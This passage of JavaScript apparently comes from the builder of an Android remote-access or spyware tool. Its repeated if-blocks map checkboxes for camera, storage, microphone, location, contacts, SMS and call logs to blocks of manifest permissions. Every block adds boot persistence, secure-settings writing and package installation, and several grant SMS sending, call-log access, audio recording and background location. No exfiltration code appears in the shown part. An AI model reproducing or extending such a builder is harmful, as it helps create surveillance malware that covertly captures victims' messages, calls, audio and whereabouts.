            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
        // if 5 checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
